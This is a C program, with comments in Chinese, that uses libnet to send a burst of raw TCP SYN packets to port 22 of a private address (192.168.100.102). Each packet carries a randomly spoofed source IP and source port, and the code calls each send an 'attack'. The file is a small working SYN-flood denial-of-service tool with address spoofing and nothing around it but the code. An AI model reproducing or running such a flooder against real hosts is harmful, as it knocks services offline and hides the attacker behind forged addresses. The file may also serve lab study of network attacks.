#include <stdio.h>
#include <stdlib.h>

#include <libnet.h>
#include <unistd.h>
#include <time.h>


typedef struct {
    libnet_t *link;
    
    int attackNum;
    int durationTime;

    char *src;
    char *dst;

    int sport;
    int dport;

    int controlFlag;

} TcpPack;

void build_pack(TcpPack *pack);

// 初始化,包
void init_pack(TcpPack *pack) {
    pack->dst =  "192.168.100.102";
    // pack.sport = 1023;
    pack->dport = 22;

    // pack->controlFlag = TH_FIN;
    pack->controlFlag = TH_SYN;
    // int  controlFlag = TH_PUSH | TH_ACK; 

    pack->attackNum = 100; // 攻击次数
    pack->durationTime = 100; // 秒

}


// 发送
void send_pack(TcpPack *pack) {
    char errBuff[1024];
    
    int ret;


    struct timespec ts;

    // 一次攻击,持续多少时间
    float nsec = pack->durationTime / pack->attackNum  ; // 秒 + 毫秒
    
    if (nsec >= 1 ) { // 超过,一秒
        ts.tv_sec =  (int)nsec; // 秒
    } else {
        ts.tv_sec = 0;
    }
    ts.tv_nsec = (nsec - ts.tv_sec) * 1000000000;

    // printf("%ld\n", ts.tv_nsec);
    // 发送
    for (int i = 0; i < pack->attackNum; i++) {
        // 初始化
        pack->link = libnet_init(LIBNET_RAW4, NULL, errBuff);
        if (pack->link == NULL ) {
            perror("init: ");
        }
        
        // 构建,包
        build_pack(pack);

        // 发送数据包
        ret = libnet_write(pack->link);
        printf("发送的长度: %d\n", ret);
        perror("send: ");

        // 销毁
        libnet_destroy(pack->link);

        nanosleep(&ts, NULL);

    }
}

// 构建,tcp包
void build_pack(TcpPack *pack) {
    // char *src = pack->src;
    char *dst = pack->dst;
    
    srand(time(NULL));
    // int sport = pack->sport;
    int sport = rand();
    
    int dport = pack->dport;
    int controlFlag = pack->controlFlag; // 控制符

    char *msg = "";
    int msgLen = strlen( msg);


    libnet_ptag_t tag = 0;
    
    int seq = 1234;
    int ack = 0;
    // int  controlFlag = TH_PUSH | TH_ACK; 
    int win = 1024;

    int tcpLen = LIBNET_TCP_H;

    // 构建,tcp包
    libnet_build_tcp(
        sport, dport,

        seq,  ack,

        controlFlag,  win,

        0, 0, tcpLen,
        
        msg, msgLen,
        pack->link, 0);

    int ipLen = LIBNET_IPV4_H + LIBNET_TCP_H + msgLen; // ip包头的长度
            // 20 + 20 


    int ipId = 12345; // ip标识
    int ipPos = 0; // 片偏移

    int ttl = 64;
    int bfProt = IPPROTO_TCP; // 上层协议

    int src = rand();
    // 构建 ipv4 包
    tag = libnet_build_ipv4(
        ipLen, 0,
        ipId, ipPos,
        ttl, bfProt, 0, // 校验和（自动计算）

        src, libnet_name2addr4(pack->link, dst, LIBNET_DONT_RESOLVE) ,
        NULL, 0, // 负载数据为空,  长度为0
        pack->link, 0 
    );

    printf("%d %d \n", sport, src);

}

int main() {
    TcpPack pack;

    init_pack(&pack);

    send_pack(&pack);

}